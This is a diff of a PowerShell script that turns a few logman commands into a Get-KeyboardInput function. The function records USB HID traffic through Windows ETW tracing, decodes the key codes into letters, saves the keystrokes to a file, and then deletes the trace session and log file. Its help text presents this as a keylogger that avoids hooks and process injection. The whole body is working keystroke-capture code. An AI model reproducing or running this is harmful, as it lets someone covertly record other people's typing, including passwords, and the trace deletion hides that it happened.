@@ -1,14 +1,38 @@
-Logman create trace –n usbtrace –o “C:\windows\tracing\trace.etl” –nb 128 640 –bs 128
-Logman update trace –n usbtrace –p Microsoft-Windows-USB-USBPort
-Logman start -n usbtrace
-Logman stop -n usbtrace
+function Get-KeyboardInput {
+<#
+    .Synopsis
+        Capture input from USB keyboards and Mice.
+    .description
+        Logman can capture raw USB packets containing HID data. We can translate that into actual keystrokes. Requires local admin, but
+        leverages normal Windows logging without any need for hooks or process injection.
+    .Example
+        Get-KeyboardInput -source C:\windows\tracing -destination C:\ -tracetime "10" -- logs keyboard input for 10s then saves the log to C:\,
+        then parses the log and saves the keystrokes recorded to C:\output.txt. Mouse data is recorded as well, though I haven't figured out
+        how to parse that yet.
+#>
+[cmdletbinding()]
+param(
+[parameter(mandatory=$true)]
+$Source,
+[parameter(mandatory=$true)]
+$tracetime,
+[parameter(mandatory=$true)]
+$destination
+)
 
+logman create trace -n "usbtrace" -o "$source\trace.etl" -nb "128 640" -bs "128"
+logman update trace -n "usbtrace" -p "microsoft-windows-usb-usbport"
+logman start -n usbtrace
 
-$log=get-winevent –path "C:\windows\tracing\usbtrace2_000002.etl" –oldest | where {$_.message –match “Data”}
+sleep $TraceTime
 
-$HID = Foreach ($L in $log) {(‘{0:x}’ -f ($L.properties.value[5]))}
+logman stop -n usbtrace
 
-switch ($HID)
+$Input=get-winevent –path "$Source\trace_000001.etl" –oldest | where {$_.message –match “Data”}
+
+$HID = Foreach ($I in $Input) {(‘{0:x}’ -f ($I.properties.value[5]))}
+
+$Data=switch ($HID)
 {
     4 {"A"}
     5 {"B"}
@@ -36,4 +60,9 @@ switch ($HID)
     1B {"X"}
     1C {"Y"}
     1D {"Z"}
+}
+logman delete -n usbtrace
+delete "$source\trace_000001.etl"
+$Data | out-file "$Destination\Output.txt"
+
 }
